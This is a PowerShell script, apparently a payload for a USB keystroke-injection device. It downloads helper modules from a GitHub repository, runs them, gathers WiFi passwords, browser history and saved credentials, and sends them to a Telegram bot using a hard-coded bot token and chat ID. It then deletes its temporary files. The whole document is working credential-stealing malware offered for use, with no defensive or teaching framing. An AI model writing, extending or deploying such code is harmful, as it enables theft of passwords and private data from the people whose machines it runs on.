<#
.SYNOPSIS
    Rubber Duck Data Collection Script
.DESCRIPTION
    Collects WiFi passwords, browser history, and saved credentials, then sends to Telegram bot.
.NOTES
    This script should be hosted on GitHub and called with a single command.
#>

# Configuration
$TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$REPO_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/"

# Temporary directory
$tempDir = "$env:TEMP\RubberDuck"
if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir | Out-Null }

# Download modules from GitHub
function Download-Module {
    param ($moduleName)
    $url = "$REPO_URL/modules/$moduleName"
    $output = "$tempDir\$moduleName"
    try {
        Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop
        return $true
    }
    catch {
        return $false
    }
}

# Import modules
$modules = @("wifi.ps1", "browser.ps1", "telegram.ps1")
foreach ($module in $modules) {
    if (Download-Module $module) {
        . "$tempDir\$module"
    }
    else {
        # Send error to Telegram if module fails to download
        Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message "Failed to download module: $module"
        exit 1
    }
}

# Main collection function
function Collect-AllData {
    $output = @()
    
    # Get WiFi passwords
    $wifiData = Get-WifiPasswords
    $output += "=== WiFi Passwords ==="
    $output += $wifiData
    
    # Get browser data
    $browserData = Get-BrowserData
    $output += "`n=== Browser Data ==="
    $output += $browserData
    
    return ($output -join "`n")
}

# Execute collection and send to Telegram
try {
    $collectedData = Collect-AllData
    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $collectedData
    
    # Cleanup
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
catch {
    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message "Error during data collection: $_"
}
